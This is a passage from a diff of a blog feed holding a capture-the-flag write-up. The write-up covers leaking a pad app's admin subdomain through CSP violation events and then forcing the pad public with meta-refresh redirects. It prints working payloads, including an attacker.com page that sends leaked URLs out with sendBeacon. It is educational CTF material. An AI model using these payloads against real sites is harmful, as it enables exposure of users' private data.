 <p>The initial plan is to use csp violations to leak the subdomain. So to do that we have to first redirect the bot to our attacker&rsquo;s website. Since <code>.setHTML()</code> allows meta tags we can use a meta redirect to our attacker controlled website .</p>
 <h2 id="csp-violation-leak-">CSP violation leak 🌟</h2>
 <p>If we put <code>https://xn--pd-viaaa.space/p/latest </code> in an iframe and then add a csp with   <code>frame-src https://xn--pd-viaaa.space/p/latest </code> it will trigger a csp violation , because <code>https://xn--pd-viaaa.space/p/latest </code> redirects to <code>unique_id.xn--pd-viaaa.space</code> .</p>
 <p>So using this technique we can leak the unique_id .</p>
 <h2 id="csrf-to-make-the-note-public-">CSRF to make the note public 🌟</h2>
 <p>After getting the unique id there is still one more problem to solve. The admins pad is not public, so we can&rsquo;t access it directly due to this check.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>pad.isPublic <span style="color:#ff79c6">&amp;&amp;</span> req.session.username <span style="color:#ff79c6">!=</span> pad.username){
-        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Not allowed to access this non-public päääd.&#39;</span>)
-        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-    }
-</code></pre></div><p>The code to make the note public is as follows.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">if</span>(req.session.username <span style="color:#ff79c6">==</span> pad.username){
-        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isPublic&#39;</span>){
-            pad.isPublic <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">!</span>pad.isPublic
-            <span style="color:#ff79c6">await</span> pad.save()
-            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-        }
-        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isTemp&#39;</span>){
-            pad.createdAt <span style="color:#ff79c6">=</span> pad.createdAt <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">undefined</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>()
-            <span style="color:#ff79c6">await</span> pad.save()
-            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-        }
-    }
-</code></pre></div><p>So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having <code>sameSite: 'strict'</code> . So doing a csrf to make the note public won&rsquo;t work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>pad.isPublic <span style="color:#ff79c6">&amp;&amp;</span> req.session.username <span style="color:#ff79c6">!=</span> pad.username){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Not allowed to access this non-public päääd.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The code to make the note public is as follows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(req.session.username <span style="color:#ff79c6">==</span> pad.username){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isPublic&#39;</span>){
+</span></span><span style="display:flex;"><span>            pad.isPublic <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">!</span>pad.isPublic
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isTemp&#39;</span>){
+</span></span><span style="display:flex;"><span>            pad.createdAt <span style="color:#ff79c6">=</span> pad.createdAt <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">undefined</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having <code>sameSite: 'strict'</code> . So doing a csrf to make the note public won&rsquo;t work.</p>
 <p>To overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to <code>unique_id.xn--pd-viaaa.space?edit=isPublic</code> to make the note public.</p>
 <h2 id="--final-payloads">🚀  Final Payloads</h2>
 <p><code>First pad</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#6272a4">&lt;!-- redirect to attacker site --&gt;</span>
-&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=https://attacker.com/attacker.html&#34;</span>&gt;
-</code></pre></div><p><code>https://attacker.com/attacker.html</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">html</span>&gt;
-&lt;<span style="color:#ff79c6">head</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">charset</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Content-Security-Policy&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frame-src &#39;self&#39; xn--pd-viaaa.space;&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">title</span>&gt;TEST&lt;/<span style="color:#ff79c6">title</span>&gt;
-&lt;/<span style="color:#ff79c6">head</span>&gt;
-
-&lt;<span style="color:#ff79c6">body</span>&gt;
-    &lt;<span style="color:#ff79c6">script</span>&gt;
-        <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;securitypolicyviolation&#39;</span>, <span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> (event) {
-            console.log(event)
-            navigator.sendBeacon(location.href,event.blockedURI)
-
-        });      
-    &lt;/<span style="color:#ff79c6">script</span>&gt;
-    &lt;<span style="color:#ff79c6">iframe</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://päääd.space/p/latest&#34;</span>&gt;&lt;/<span style="color:#ff79c6">iframe</span>&gt;
-&lt;/<span style="color:#ff79c6">body</span>&gt;
-
-&lt;/<span style="color:#ff79c6">html</span>&gt;
-</code></pre></div><p><code>Second pad</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#6272a4">&lt;!-- to make pad public--&gt;</span>
-&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=unique_id.xn--pd-viaaa.space?edit=isPublic&#34;</span>&gt;
-</code></pre></div><h2 id="-flag">🚩 Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- redirect to attacker site --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=https://attacker.com/attacker.html&#34;</span>&gt;
+</span></span></code></pre></div><p><code>https://attacker.com/attacker.html</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">charset</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Content-Security-Policy&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frame-src &#39;self&#39; xn--pd-viaaa.space;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">title</span>&gt;TEST&lt;/<span style="color:#ff79c6">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;securitypolicyviolation&#39;</span>, <span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> (event) {
+</span></span><span style="display:flex;"><span>            console.log(event)
+</span></span><span style="display:flex;"><span>            navigator.sendBeacon(location.href,event.blockedURI)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        });      
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">iframe</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://päääd.space/p/latest&#34;</span>&gt;&lt;/<span style="color:#ff79c6">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
+</span></span></code></pre></div><p><code>Second pad</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- to make pad public--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=unique_id.xn--pd-viaaa.space?edit=isPublic&#34;</span>&gt;
+</span></span></code></pre></div><h2 id="-flag">🚩 Flag</h2>
 <p><code>flag{hmmmmmmmmmXDD} </code></p>]]></description>
       
     </item>
